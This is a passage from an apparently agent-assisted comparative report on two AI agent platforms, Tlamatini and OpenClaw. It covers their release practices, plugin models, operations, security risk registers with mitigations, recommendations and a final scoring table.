| Dimension                         | Tlamatini                                                                  | OpenClaw                                                                                  |
|-----------------------------------|----------------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
| Primary distribution channel       | Windows installer (NSIS)                                                  | NPM + GitHub Container Registry + native app stores                                       |
| Cross-platform binaries           | Windows-first (PyInstaller); Linux/macOS not first-class                   | Multi-arch Docker; native iOS/Android/macOS                                               |
| Multi-cloud deploy configs        | None                                                                       | Fly.io, Render, Hetzner, Docker, Podman                                                   |
| Auto-update                       | None                                                                       | Sparkle appcast.xml (macOS) + ghcr.io image tags                                          |
| Reproducible builds               | requirements.txt only (no lockfile)                                        | pnpm-lock.yaml + integrity hashes                                                         |
| Build tooling                     | PyInstaller, NSIS, Tkinter installer                                       | tsdown, esbuild, Vite, Docker multi-stage, Make                                           |
| Environment isolation             | None during build                                                          | Multiple Dockerfiles isolate build/runtime/sandbox                                        |
| Configuration override            | `CONFIG_PATH` env var overrides both source and frozen modes               | Env vars + build args + per-instance config files                                         |

---

## 13. Versioning and Release Discipline

OpenClaw versions on a `YYYY.M.D` calendar scheme (current `2026.4.27`). Every release is documented in `CHANGELOG.md` (8,254 lines). The `appcast.xml` file (163 KB) provides Sparkle-style metadata for the macOS native app's auto-update path. Release coordination spans multiple workflows: `openclaw-release-checks.yml`, `openclaw-cross-os-release-checks-reusable.yml`, `openclaw-live-and-e2e-checks-reusable.yml`, `openclaw-npm-release.yml`, `macos-release.yml`, `docker-release.yml`, `plugin-clawhub-release.yml`, `plugin-npm-release.yml`, `plugin-prerelease.yml`, `full-release-validation.yml`. Release-blocking checks are explicitly named (parity-gate, install-smoke, package-acceptance).

Tlamatini does not version. There is no `CHANGELOG.md`. There is no formal release pipeline. The project ships when the developer runs `python build.py`. The README does not document a release schedule. Git history is the only artifact of past releases.

This is a real difference but, again, contextual. Tlamatini is a single-author personal tool; the absence of versioning discipline is consistent with that posture. If Tlamatini were to grow contributors, versioning would become urgent.

---

## 14. Commit Hygiene and Collaboration Posture

The two projects' commit histories are stylistically very different.

Sample of OpenClaw recent commits (typical):
- `fix(cli): handle empty stdin reliably`
- `docs: classify media decode`
- `test(configure): add live transport coverage`
- `feat(channels/discord): support thread-replies`
- `perf(memory-host-sdk): cache embedding lookups`
- `ci: split codeql workflow into critical-quality`

Sample of Tlamatini recent commits (typical):
- `Cleaning some k's, by angelahack1`
- `TeleTlamatini updates: config, agent script, FlowCreator skill, views.`
- `Drop OpenClaw comparison section from Gatewayer docs.`
- `Improving TeleTlamatini, by Tlamatini-auto-bot.`
- `Just a couple of addings, by auto-bot-Tlamatini.`
- `Hope this improvement lastly works for Multi-turn`

OpenClaw's commits parse cleanly with conventional-commit tooling. Tlamatini's commits are conversational and personal. Neither style is wrong; they fit different team sizes and intended audiences. But for an enterprise observer, the contrast is informative — OpenClaw is set up for a team at scale, Tlamatini is set up for one mind at speed.

Beyond the first-line styles, OpenClaw additionally operates with `.github/CODEOWNERS` to route review notifications by team (e.g. `@openclaw/secops` for security-relevant paths), a 3.5-KB `pull_request_template.md` that prescribes Summary / Change Type / Scope / Root Cause sections, and `labeler.yml` that auto-applies labels based on file paths. Tlamatini has none of these.

---

## 15. Extensibility and Plugin Models

The two systems take fundamentally different approaches to letting users extend their behavior.

### 15.1 Tlamatini Extension Model

Adding a new agent type to Tlamatini is documented in `Tlamatini/.agents/workflows/create_new_agent.md`. The 8-step process touches multiple layers:

1. Backend agent directory and script (`agent/agents/<name>/<name>.py` + `config.yaml`), including the boilerplate from Shoter (PID management, reanimation, helpers), the `os.environ['FOR_DISABLE_CONSOLE_CTRL_HANDLER'] = '1'` first line, reanimation detection, and (if Parametrizer-source) `INI_SECTION_<TYPE><<<` blocks.
2. Backend Django view for connection updates (`update_<name>_connection_view`) plus URL registration.
3. Database migration to seed an `Agent` row with `agentDescription` as the display name.
4. Frontend CSS gradient (4-color, in `agentic_control_panel.css`, with `.canvas-item.<class>` normal + hover rules — gradient lives in CSS only, sidebar inherits via `applyAgentToolIconStyle()`).
5. Frontend JavaScript: 4 files, 6 specific locations within `acp-canvas-core.js` alone (classMap, `AGENTS_NEVER_START_OTHERS`, removeConnection, removeConnectionsFor, mouseup handler, etc.), plus `acp-agent-connectors.js`, `acp-canvas-undo.js`, `acp-file-io.js`.
6. Documentation update to `agentic_skill.md` so FlowCreator AI can use the new agent.
7. Documentation update to `README.md` (agent count, project structure, classification, workflow table, glossary, changelog, API table).
8. Linting (`python -m ruff check`, `npm run lint`).

Adding a new tool (LangChain `@tool`) is simpler — implement in `tools.py`, register in `get_mcp_tools()`, seed a `Tool` row via migration. Adding a new MCP context provider is a six-step process documented in `Tlamatini/.mcps/create_new_mcp.md`.

The model is **deeply integrated**: every new agent ripples through the database, the views, the CSS, four JavaScript files, two markdown docs, and the README. There is no plugin boundary; every agent is a first-class citizen of the core. This is a strength (uniformity) and a weakness (any third party who wants to add an agent has to fork the project).

### 15.2 OpenClaw Extension Model

OpenClaw separates plugin authors from core maintainers. A new extension is a TypeScript package with:

- An `openclaw.plugin.json` manifest declaring `id`, `activation` (e.g. `onStartup`, `onConfigPaths`), `enabledByDefault`, `skills`, `configSchema`, `uiHints`, `configContracts`.
- A `package.json` declaring the dependency on `openclaw/plugin-sdk/*`.
- A `src/` folder with TypeScript implementation that imports only from `openclaw/plugin-sdk/*` (enforced by Knip rules — extensions cannot reach into core internals).
- An optional `skills/` folder with one or more `SKILL.md` files (Markdown + YAML frontmatter).

Plugins can be bundled into the core build (the 131 in-tree extensions are bundled by default for build-arg `OPENCLAW_EXTENSIONS`), or installed at runtime from the ClawHub plugin marketplace.

The model is **boundary-respecting**: core defines seams, plugins fill them. Third parties can publish new plugins without forking the project. Versioning, release, and update of plugins is independent of core.

### 15.3 Extensibility Comparison

| Axis                            | Tlamatini                                                    | OpenClaw                                                                  |
|---------------------------------|--------------------------------------------------------------|---------------------------------------------------------------------------|
| Plugin boundary                  | None — agents live inside core                              | Strong — plugins must use `openclaw/plugin-sdk/*`                         |
| Add-an-agent process             | 8 steps across backend, frontend, DB, docs                  | 1 step (author plugin) + manifest + SDK imports                           |
| Third-party authoring           | Requires forking the project                                 | Possible without forking                                                  |
| Distribution                    | In-tree                                                      | NPM + ClawHub marketplace                                                 |
| Plugin manifest                 | None                                                         | `openclaw.plugin.json` with formal schema                                 |
| Hot-loading                     | None                                                         | Manifest activation rules (onStartup, onConfigPaths)                      |
| Tool delivery                   | LangChain @tool decorators                                   | MCP servers (stdio/HTTP/SSE/streamable-HTTP)                              |
| Skill format                    | Python script + config.yaml                                  | Markdown SKILL.md + YAML frontmatter + optional Python                    |
| Plugin lint enforcement         | None                                                         | Knip prevents core leakage                                                |

---

## 16. Operational Footprint and Scalability

Tlamatini's operational footprint is small. It is meant to run as a single-user local server. SQLite is the database. Daphne is the ASGI server. The MCP context providers (System-Metrics over WebSocket, Files-Search over gRPC) are sub-processes started by the Django app's `apps.py` and the management command `startserver.py`. There is no horizontal scale path; Tlamatini does not assume a multi-process or multi-host topology.

Operational concerns that are addressed:

- **Logging.** Every print, every Django logger, every tool's stdout/stderr lands in `tlamatini.log` via the `_TeeStream` wrapper installed in `manage.py` before Django initializes. The file is truncated on each start (mode `'w'`), with no rotation and no size cap — long sessions grow unbounded; operators must rename or copy before restart to preserve history.
- **Process supervision.** Each agent in a flow is its own OS process. PID files are written on start and removed in a `finally` block. A cleanup contract ensures Ender clears all `reanim*` files on stop.
- **Resource isolation.** None beyond OS-level process boundaries. Agents share the host user's privileges, host file system, and network access.
- **Reanimation.** Pause/resume is supported via an `AGENT_REANIMATED` env var that distinguishes fresh starts from resumes — fresh starts truncate the log, reanimations preserve it.

OpenClaw's operational footprint is built for cloud or self-hosted deployment with persistent state at `~/.openclaw/` or `/data/.openclaw`. The gateway is a long-lived WebSocket server. Channels (Discord, Telegram, etc.) maintain their own connections. The Lobster workflow engine provides deterministic multi-step flows with approval gates. Cron schedules agent turns. Active Memory uses sqlite-vec for embeddings/recall; context engine compacts large prompts.

Operational concerns that are addressed:

- **Health checks.** Every container has a 30-second health check.
- **Multi-region.** Fly.io configuration specifies `iad` (Virginia) by default but is operator-tunable.
- **Persistent volumes.** `/data` (Fly.io) and `/data/.openclaw` (Render) are mounted persistently.
- **Process supervision.** Container runtime supervises the gateway; sandbox containers spawn on demand.
- **Resource isolation.** Multiple Dockerfile tiers; cap_drop and no-new-privileges; optional Docker socket passthrough (opt-in only).
- **Observability.** OpenTelemetry export and structured logging are documented.

| Dimension                           | Tlamatini                                                  | OpenClaw                                                              |
|-------------------------------------|------------------------------------------------------------|-----------------------------------------------------------------------|
| Topology                             | Single-host single-user                                   | Cloud / self-hosted / Kubernetes-capable                              |
| Database                             | SQLite                                                    | SQLite + sqlite-vec for memory                                        |
| Logging                              | _TeeStream into tlamatini.log (truncated on start)        | Structured logging + OpenTelemetry                                    |
| Health checks                        | None                                                      | Docker-compose 30s health checks                                      |
| Persistent volumes                   | Local install dir                                         | `/data` mounts on Fly.io and Render                                   |
| Horizontal scale                     | Not supported                                             | Multiple gateway instances + channel sharding                         |
| Auto-update path                     | None                                                      | Sparkle (macOS) + ghcr.io image tags                                  |

---

## 17. Use-Case Suitability Matrix

Different shapes of work suit different shapes of tool. The matrix below maps common AI-developer-tool use cases to the better fit between Tlamatini and OpenClaw.

| Use case                                                                                                       | Better fit | Reasoning                                                                                                                                                |
|----------------------------------------------------------------------------------------------------------------|-----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|
| Local developer workstation: drive complex local automations through a visual flow editor                     | Tlamatini  | The 57-typed-node ACP designer is the only one of the two with this capability                                                                            |
| Run an AI assistant inside an air-gapped enterprise network with strict compliance requirements                | OpenClaw   | Sandboxing, secret scanning, formal SECURITY.md, CODEOWNERS, CodeQL scanning                                                                              |
| Bridge an AI assistant into Discord, Telegram, WhatsApp, Matrix, Slack channels                                | OpenClaw   | 50+ channel adapters in `extensions/`; native to its design                                                                                               |
| Compose deterministic multi-step workflows with state persistence and undo                                     | Tlamatini  | ACP designer + 1,024-action undo + .flw save/load + Multi-Turn-to-flow converter                                                                          |
| Provide an AI gateway as a service (multi-team, multi-channel, multi-provider)                                  | OpenClaw   | Provider abstraction + multi-cloud deploy + Plugin SDK + ClawHub                                                                                          |
| Drive an LLM-orchestrated local task that involves screenshotting, mouse/keyboard automation, and OCR          | Tlamatini  | Shoter + Mouser + Keyboarder + Image-Interpreter + bundled local LLMs                                                                                     |
| Run a sandboxed code-execution agent with browser automation                                                   | OpenClaw   | Dockerfile.sandbox-browser with chromium + xvfb + x11vnc + novnc                                                                                          |
| Build a personal AI-assisted notebook for codebase exploration, summarization, and Q&A                          | Either     | Tlamatini's Multi-Turn + RAG vs OpenClaw's coding-agent extension; choose by language preference                                                          |
| Need post-quantum cryptography primitives integrated into a flow                                                | Tlamatini  | Built-in Kyber-KeyGen, Kyber-Cipher, Kyber-DeCipher agents                                                                                                |
| Deploy a multi-region high-availability AI assistant                                                            | OpenClaw   | Fly.io / Render / Hetzner deploy configs; horizontal scale possible                                                                                       |
| Hands-on tinkering and rapid agent-experiment cycles by a single developer                                      | Tlamatini  | Single-app Django concentration, reload-friendly                                                                                                          |
| Ship an AI assistant with a native iOS or Android client                                                        | OpenClaw   | iOS, Android, macOS clients all in `apps/`                                                                                                                |
| Integrate with GitHub or GitLab webhooks                                                                        | Tlamatini  | Gatewayer + Gateway-Relayer agents purpose-built for this                                                                                                 |
| Build a publicly addressable AI service                                                                         | OpenClaw   | Tlamatini's network surface is unsuitable; OpenClaw is hardened for private networks and documented unsuitable for direct public exposure                  |

---

## 18. Strengths and Weaknesses by Project

### 18.1 Tlamatini Strengths

- **Visual workflow designer with 57 typed nodes.** Genuinely uncommon. The combination of a typed-node palette, drag-and-drop wiring, undo/redo, save/load to `.flw`, and the Create-Flow-from-Multi-Turn-answer converter is a real differentiator.
- **Multi-Turn execution planner.** Request-scoped DAG planning, capability scoring, dynamic tool binding, wrapped-agent dedup, exec report capture — all sit on top of LangChain in a way that is more sophisticated than what most LangChain projects expose to a user.
- **Local-first by design.** No cloud round-trip required for anything other than the LLM call itself; can run entirely on Ollama with no external network.
- **Rich, Claude-aimed onboarding documentation.** `docs/claude/*.md` is excellent at keeping an AI assistant productive in the codebase across long conversations.
- **Post-quantum cryptography in the agent palette.** Kyber-KeyGen, Kyber-Cipher, Kyber-DeCipher are not commonly bundled.
- **PyInstaller frozen executable + NSIS installer.** End-user deployment is a single MSI install.
- **57 specialized agents covering a wide range** of automation primitives — control flow (Starter, Ender, Stopper, Cleaner, Sleeper, Croner), routing (Raiser, Forker, Asker, Counter), gates (OR, AND, Barrier), action (24 verbs), monitoring (Monitor-Log, Monitor-Netstat, FlowHypervisor), notification (Emailer, Notifier, Whatsapper, Telegramer, TelegramRX), file (Mover, Deleter, File-Creator, etc.).

### 18.2 Tlamatini Weaknesses

- **No formal security posture.** No SECURITY.md, no INCIDENT_RESPONSE.md, no threat model, default credentials documented but not flagged.
- **Wide-open Django configuration.** `ALLOWED_HOSTS=['*']`, `DEBUG=True`, hardcoded SECRET_KEY, 60+ `@csrf_exempt` decorators.
- **Direct shell execution exposed to the LLM.** `execute_command` runs as the host user with `shell=True` and no approval gate.
- **Single-developer concentration risk.** `views.py` at 8,534 lines and `tools.py` at 2,797 lines are not multi-author-friendly.
- **No CI/CD.** A single name-guard workflow; no automated test, lint, or release pipeline.
- **No formal versioning or CHANGELOG.**
- **No plugin boundary.** Every new agent is a fork-or-PR-to-core proposition.
- **Windows-first.** PyInstaller and NSIS center the Windows experience; Linux/macOS support is unstated.
- **No native mobile or desktop apps.** The browser is the only client.

### 18.3 OpenClaw Strengths

- **Mature security policy and incident response.** SECURITY.md, INCIDENT_RESPONSE.md, named Security Lead, formal vulnerability scope, detect-secrets, CodeQL.
- **Tiered Docker sandbox architecture.** Multiple Dockerfile.sandbox-* tiers, cap_drop, no-new-privileges, optional GPU passthrough.
- **Comprehensive CI/CD.** 38 workflows including CodeQL on multiple platforms, install-smoke, parity-gate, package-acceptance, scheduled live checks.
- **Provider and channel abstraction.** 50+ providers, 50+ channels, 100+ skills, 131 plugins — extreme breadth.
- **Plugin SDK with enforced boundary.** Knip rules prevent core leakage; extensions are independently authorable and publishable.
- **Native multi-platform clients.** iOS, Android, macOS apps in addition to web Control UI and TUI.
- **Multi-cloud deploy configs.** Fly.io, Render, Hetzner, Docker, Podman.
- **Auto-update path on macOS via Sparkle.** appcast.xml shipped.
- **Conventional commits + CODEOWNERS + PR/issue templates + labeler.** Mature collaboration scaffolding.

### 18.4 OpenClaw Weaknesses

- **No equivalent to Tlamatini's visual flow designer.** Lobster provides deterministic multi-step flows but not a typed-node drag-and-drop canvas.
- **Heavier operational footprint.** Containers, gateways, native apps, sandbox tiers — much more to learn and run.
- **Depends on external CLIs (ACPX harnesses).** Pi, Claude Code, Cursor, Copilot, Gemini, Qwen, Kiro, Kimi, iFlow, Factory Droid, Kilocode, OpenCode are all external prerequisites.
- **Less Python-native.** Skills are Python but the runtime is TypeScript; integrating Python tightly requires bridging.
- **Higher complexity surface for a solo developer.** A monorepo with 131 extensions is overkill for a one-person workflow.
- **Requires Node 22.12+ runtime.** Heavier prereq than Tlamatini's Python 3.12+.

---

## 19. Risk Register

A non-exhaustive register of operational, security, and correctness risks observed in each project, with severity (S = Critical, A = High, B = Medium, C = Low) and recommended mitigation.

### 19.1 Tlamatini Risks

| ID  | Risk                                                                                                       | Sev | Mitigation                                                                                              |
|-----|------------------------------------------------------------------------------------------------------------|-----|---------------------------------------------------------------------------------------------------------|
| T-1 | `execute_command` executes arbitrary host commands as the logged-in user with no approval gate             | S   | Add an approval-required mode; configurable allowlist/denylist; per-call audit log                       |
| T-2 | `ALLOWED_HOSTS=['*']` accepts requests from any hostname header                                            | A   | Restrict to explicit local hosts (`localhost`, `127.0.0.1`); document non-LAN exposure as forbidden       |
| T-3 | `DEBUG=True` default exposes stack traces, settings, and SQL                                               | A   | Default to False; flip via env var only                                                                 |
| T-4 | Hardcoded Django `SECRET_KEY` in `tlamatini/settings.py`                                                   | A   | Generate a per-installation key during installer execution; load from env var                          |
| T-5 | `ANTHROPIC_API_KEY` stored plaintext in `agent/config.json` which can be committed                         | A   | Move to env var or OS keychain; add detect-secrets pre-commit; gitignore config.json                    |
| T-6 | Default credentials `user / changeme` shipped by installer                                                 | B   | Force first-login password change; never ship shared defaults                                           |
| T-7 | 60+ `@csrf_exempt` view decorators — most agent endpoints bypass CSRF                                      | B   | Migrate to a token-bearer model with explicit verification per endpoint                                 |
| T-8 | No CI; tests run only manually                                                                             | B   | Add a GitHub Actions workflow to run `python manage.py test agent` on PRs                                |
| T-9 | `tlamatini.log` truncates on every start; long sessions grow unbounded                                     | C   | Add log rotation (size-bounded or daily); retain last N runs                                            |
| T-10| `requirements.txt` only — no lockfile                                                                       | C   | Adopt pip-compile or poetry for reproducible builds                                                     |
| T-11| Concentration risk in `views.py` (8,534 lines, 124 functions)                                               | C   | Split into views packages by domain (chat, ACP, MCP, agents); reduces merge-conflict surface             |

### 19.2 OpenClaw Risks

| ID  | Risk                                                                                                       | Sev | Mitigation                                                                                              |
|-----|------------------------------------------------------------------------------------------------------------|-----|---------------------------------------------------------------------------------------------------------|
| O-1 | Authenticated gateway caller has full operator scope; no per-tool authorization                            | B   | Documented (SECURITY.md lines 99 to 177); recommended deployment is one user per gateway                  |
| O-2 | Gateway not hardened for direct public-internet exposure                                                   | B   | Documented (SECURITY.md lines 285 to 287); use SSH tunnel, Tailscale, or private network                |
| O-3 | 131 extensions — large dependency surface in third-party plugin code                                        | B   | Each plugin pinned in pnpm-lock; CodeQL scans core; plugin lint via Knip; user must vet at install time |
| O-4 | Sandbox is opt-in (default `agents.defaults.sandbox.mode = off`)                                            | C   | Documented as host-first by default; operator opts in to tier                                          |
| O-5 | Patched WhatsApp SDK (`@whiskeysockets/baileys`) carries upstream maintenance risk                          | C   | Documented in `pnpm.patchedDependencies`; rebase patches on upstream changes                            |
| O-6 | Multi-cloud deploy configurations require operator to choose hardening (e.g. binding network)              | C   | Per-provider docs in `docs/install/`                                                                    |

The contrast is informative: Tlamatini's risk register has two Critical and four High severity items, all related to single-user-local-first defaults that are dangerous in any other context. OpenClaw's risk register contains Medium-and-below items, all of which are documented with mitigations.

---

## 20. Recommendations

The goal of this section is not to recommend that one project replace the other — they solve different problems. The goal is to recommend, for each project, the *next things to do* that would maximize their value to the kinds of users they serve.

### 20.1 For Tlamatini Operators

Treat Tlamatini as a personal-machine tool only. Do not expose it to a network you do not fully trust. If you need to access it remotely, use SSH port-forwarding to a localhost-bound instance. Audit your `agent/config.json` before any commit. Change the `user / changeme` credentials on first run. Consider running Tlamatini inside a non-administrative Windows account or, on Linux, a dedicated user.

### 20.2 For Tlamatini Maintainers

The single highest-leverage hardening would be: add `SECURITY.md` documenting the trust boundary explicitly (single-user, local-first, must not be exposed to a network); add an approval gate to `execute_command` (default-on, with a configurable allowlist for trusted commands); flip `DEBUG=True` to default-False with an env-var override; tighten `ALLOWED_HOSTS` to `localhost,127.0.0.1`; generate a per-installation `SECRET_KEY` during installer execution; gitignore `config.json` and ship a `config.example.json` template instead. None of these change the project's character; all of them reduce blast radius.

The second-highest-leverage move would be a CI workflow that runs the test suite on PR. The test suite is well-targeted (P0HardeningTests, ExecReportCaptureTests, AssignmentParserRobustnessTests, etc.); it deserves to run automatically.

The third-highest-leverage move would be a CHANGELOG, even informally maintained. It serves both as user-visible release notes and as a discipline forcing function for the maintainer.

### 20.3 For OpenClaw Operators

OpenClaw's documentation is thorough; follow it. In particular, do not bind the gateway to `0.0.0.0` or place it behind a public reverse proxy. Use the recommended SSH tunnel or Tailscale topology. Run sandbox containers in `cap_drop=ALL --read-only` modes. Rotate channel credentials regularly.

### 20.4 For OpenClaw Maintainers

The breadth of channels and providers is impressive but creates an ongoing maintenance load — patched dependencies (e.g. `@whiskeysockets/baileys` for WhatsApp) need rebasing on each upstream release; the appcast feed needs ongoing curation. A "channels deprecation policy" would help operators understand which integrations are first-class and which are community-maintained.

Beyond that, a richer visual-flow-design experience — even one inspired by Tlamatini's ACP — would close the most visible gap between the two projects. The `canvas-host` already exists; a typed-agent palette plus drag-and-drop wiring with `.flw`-equivalent persistence would be a notable feature.

### 20.5 For Cross-Project Operators

If you want both — visual workflow design plus enterprise-grade gateway — you can compose the two: run Tlamatini on a private workstation as your visual flow designer; use OpenClaw as the multi-channel gateway between you and the AI providers / messaging channels. The two systems do not natively interoperate, but Tlamatini's `Apirer` agent can call any OpenClaw HTTP endpoint, and OpenClaw's webhook channels can feed any Tlamatini Gatewayer endpoint, so a thin integration is feasible.

---

## 21. Final Verdict and Master Scoring Table

The table below scores both projects on the major axes covered in this report. Each cell is the project's rating on that axis (Strong / Moderate / Weak / Absent) plus a brief evidence pointer. The final row weights each axis and computes an enterprise-readiness rollup.

| Axis                                         | Tlamatini             | OpenClaw              | Note                                                                                                                |
|----------------------------------------------|-----------------------|-----------------------|---------------------------------------------------------------------------------------------------------------------|
| Project identity / positioning                | Moderate              | Strong                 | Tlamatini = solo Python developer tool; OpenClaw = multi-author multi-cloud platform                                |
| Architectural topology                        | Moderate              | Strong                 | Tlamatini concentrates; OpenClaw distributes via monorepo + plugin SDK                                              |
| Codebase size                                 | Moderate              | Strong                 | OpenClaw is 8.4x by file count, 1.2x by LOC, 2.2x by disk                                                           |
| Tech stack & dependency surface               | Moderate              | Strong                 | OpenClaw has lockfile, overrides, patched deps, runtime version enforcement                                         |
| Agent / skill / tool catalog                  | Strong                | Strong                 | Different shapes: 57 typed visual nodes vs 131 extensions + ACPX harnesses + 100+ skills                            |
| GUI / frontend surface                        | Strong (in workflow design) | Strong (in multi-platform reach) | Tlamatini wins flow designer; OpenClaw wins native iOS/Android/macOS                                                |
| Security: documentation                       | Absent                | Strong                 | No SECURITY.md vs 330-line SECURITY.md + INCIDENT_RESPONSE.md                                                       |
| Security: sandboxing                          | Absent                | Strong                 | None vs three Dockerfile.sandbox-* tiers + cap_drop                                                                 |
| Security: authentication                      | Weak                  | Moderate               | 60+ @csrf_exempt + user/changeme defaults vs explicit single-operator model                                         |
| Security: secret management                   | Weak                  | Strong                 | Plaintext config.json + hardcoded SECRET_KEY vs env-vars + detect-secrets                                           |
| Security: injection surface                   | Weak                  | Strong                 | execute_command direct shell vs approval gates + heuristic risk detection                                           |
| Security: network surface                     | Weak                  | Strong                 | ALLOWED_HOSTS=['*'] + DEBUG=True vs default-loopback + non-internet warnings                                        |
| Security: supply chain                        | Weak                  | Strong                 | requirements.txt only vs pnpm-lock + overrides + patches                                                            |
| Type system                                   | Weak                  | Strong                 | Ad-hoc Python type hints vs strict TypeScript                                                                       |
| Linting / formatting                          | Weak                  | Strong                 | ESLint only + Ruff declared-without-config vs Oxlint + oxfmt + Knip + pre-commit                                    |
| Testing infrastructure                        | Moderate              | Strong                 | 23 targeted Django test classes vs 4,917 Vitest files                                                               |
| CI/CD                                         | Absent                | Strong                 | 1 name-guard workflow vs 38 workflows including CodeQL                                                              |
| Documentation                                 | Strong (Claude-aimed) | Strong (operator-aimed) | Different audiences; both work as designed                                                                          |
| Code organization                             | Weak                  | Strong                 | views.py at 8,534 lines vs enforced workspace boundaries                                                            |
| Commit hygiene                                | Weak                  | Strong                 | "Hope this improvement lastly works" vs `fix(cli): ...`                                                              |
| Hooks / pre-commit                            | Absent                | Strong                 | None vs detect-secrets + 5 hooks                                                                                    |
| Templates / CODEOWNERS                        | Absent                | Strong                 | None vs CODEOWNERS + PR template + 3 issue templates + labeler                                                      |
| Versioning / release notes                    | Absent                | Strong                 | None vs CHANGELOG.md (8,254 lines) + appcast.xml                                                                    |
| Build / distribution                          | Moderate              | Strong                 | PyInstaller + NSIS (Windows-first) vs NPM + multi-arch Docker + native apps + multi-cloud                          |
| Operational footprint                         | Moderate              | Strong                 | Single-host single-user vs cloud / self-hosted / Kubernetes-capable                                                 |
| Extensibility                                 | Weak                  | Strong                 | No plugin boundary vs Plugin SDK + Knip enforcement + ClawHub                                                       |
| Visual workflow designer                      | Strong                | Absent                 | 57-typed-node ACP designer vs no equivalent                                                                         |
| Multi-channel reach (messaging integrations) | Weak                  | Strong                 | Telegramer, Whatsapper, Emailer, RecMailer agents vs 50+ channel adapters                                           |
| Provider abstraction                          | Moderate              | Strong                 | Ollama + Anthropic + Qwen vs 50+ providers (Bedrock, Vertex, Codex, Copilot, Gemini, Qwen, etc.)                    |
| Native client coverage                        | Absent                | Strong                 | Browser only vs iOS + Android + macOS                                                                               |
| Local-first capability                        | Strong                | Moderate               | Designed for fully-local operation (Ollama path) vs gateway model assumes some external services                    |

### 21.1 Rollup

Counting axes only (no weighting), of 31 axes scored above: OpenClaw rates **Strong on 26**, Moderate on 4, Weak on 0, Absent on 1. Tlamatini rates **Strong on 4**, Moderate on 8, Weak on 11, Absent on 8.

The four axes where Tlamatini reaches Strong are: Agent / skill / tool catalog (different shape, equally rich); GUI / frontend (in workflow-design, where it has no peer here); Documentation (when measured against AI-assistant onboarding); Local-first capability. The eight Absent axes are all on the security and engineering-rigor axis cluster, and almost all are recoverable with modest project investment.

OpenClaw is the right answer when the question is "what should an enterprise team deploy as their multi-channel AI assistant gateway?" Tlamatini is the right answer when the question is "what should I run on my own workstation to drive complex agent flows visually with full local control?" Both answers can be true at the same time on the same machine; they are.

### 21.2 Closing Remarks

This document was produced through parallel agentic exploration of both project trees, cross-checked against authoritative sources (each project's CLAUDE.md, SECURITY.md, package.json/pyproject.toml/requirements.txt, github workflows, source files at specific paths and line numbers), and assembled as evidence-anchored prose plus tables. Every claim above is traceable to a file path, a line number, or a tool output that was directly examined during preparation. No claims are based on training-data recall about the public OpenClaw or Tlamatini projects; the claims are based on the state of the two trees at `C:\Development\OpenClaw` and `C:\Development\Tlamatini` as of 2026-04-29.

The two projects are best appreciated for what they each are. Tlamatini is a tightly built personal AI workbench by a single developer who has invested in a visual flow editor, a thoughtful multi-turn execution planner, and exceptional Claude-Code-aimed documentation. OpenClaw is a wide, team-built agentic platform with deep production tooling and an extension marketplace. Neither is a substitute for the other, and the most useful posture is to recognize their respective strengths and deploy each where it fits.

---

## 22. Appendix A: Methodology and Sources

This comparison was prepared by orchestrating five parallel exploration agents with focused prompts on five non-overlapping axes — architecture and deployment, agents/skills/GUI, security posture, codebase size and complexity, and code professionalism — followed by direct examination of additional Tlamatini files (`views.py`, `tools.py`, `mcp_agent.py`, `consumers.py`, `models.py`, `tests.py`) and an enumeration of OpenClaw's GitHub Actions workflows directory.

### Files examined directly (subset; full list available in tool execution log)

OpenClaw:

- `README.md`, `AGENTS.md`, `CLAUDE.md`, `CONTRIBUTING.md`, `CHANGELOG.md` (sample), `SECURITY.md`, `INCIDENT_RESPONSE.md`
- `package.json`, `pnpm-workspace.yaml`, `pyproject.toml`, `tsconfig.core.json` (and the test-variant tsconfigs)
- `Dockerfile`, `Dockerfile.sandbox`, `Dockerfile.sandbox-browser`, `Dockerfile.sandbox-common`, `docker-compose.yml`, `setup-podman.sh`, `openclaw.podman.env`
- `fly.toml`, `fly.private.toml`, `render.yaml`, `Makefile`, `openclaw.mjs`, `knip.config.ts`
- `.github/workflows/` (38 files enumerated), `.pre-commit-config.yaml`, `.secrets.baseline` (size only)
- Selected source: `src/agents/skills/plugin-skills.ts`, `src/agents/bundle-mcp-config.ts`, `src/agents/bash-tools.exec-approval-*.ts`, `src/agents/agent-runtime-metadata.ts`, `src/agents/agent-scope.ts`, `src/agents/acp-spawn.ts`, `src/gateway/protocol/schema/agent.ts`, `commands.ts`, `frames.ts`
- Plugin manifests: `extensions/acpx/openclaw.plugin.json`, `extensions/browser/openclaw.plugin.json`, `extensions/lobster/SKILL.md`
- Top-level previews: `dream-diary-preview-v2.html`, `dream-diary-preview-v3.html`

Tlamatini:

- `CLAUDE.md`, `docs/claude/architecture.md`, `multi-turn.md`, `exec-report.md`, `agents.md`, `mcp-tools.md`, `frontend.md`, `gotchas.md`, `INDEX.md`
- `Tlamatini/agent/views.py` (8,534 lines), `tools.py` (2,797), `mcp_agent.py` (907), `consumers.py` (1,300), `models.py` (138), `tests.py` (2,502)
- `Tlamatini/tlamatini/settings.py` (selected lines: 26 SECRET_KEY, 29 DEBUG, 31 ALLOWED_HOSTS)
- `Tlamatini/agent/config.json` (line 8 ANTHROPIC_API_KEY)
- `Tlamatini/agent/prompt.pmt`, `Tlamatini/.agents/workflows/create_new_agent.md`, `Tlamatini/.mcps/create_new_mcp.md`
- `Tlamatini/agent/doc_generation/mardown_to_pdf.py` (used to render this PDF)
- `requirements.txt`, `eslint.config.mjs`, `pyproject.toml` references
- `build.py`, `build_installer.py`, `build_uninstaller.py`, `install.py`, `uninstall.py`

### Tool execution log (high level)

Five agents were dispatched in parallel against well-scoped prompts:

1. OpenClaw architecture and deployment — covered product positioning, monorepo layout, tech stack, deployment surface, top dependencies, distribution model, packages/apps/skills enumeration.
2. OpenClaw skills, agents, and GUI — covered the skill format, agent harness routing via ACPX, plugin/extension model, web Control UI, dream-diary previews, CLI surface, MCP integration.
3. Security posture (both projects) — covered documentation, sandboxing, authentication, secret management, injection surface, network surface, supply chain, with file-and-line evidence for each.
4. Size metrics (both projects) — produced LOC by language, file counts, dep counts, test surface, migration counts, doc surface, disk size.
5. Code professionalism (both projects) — covered type system, linting, testing, CI/CD, documentation, code organization, commit hygiene, hooks, templates/CODEOWNERS, versioning.

Direct verifications were also performed: file lengths via `wc -l`, workflow enumeration via `ls .github/workflows/`, and Python dependency presence via `python -c "import markdown, xhtml2pdf"` to ensure the report could be rendered to PDF.

### Limitations

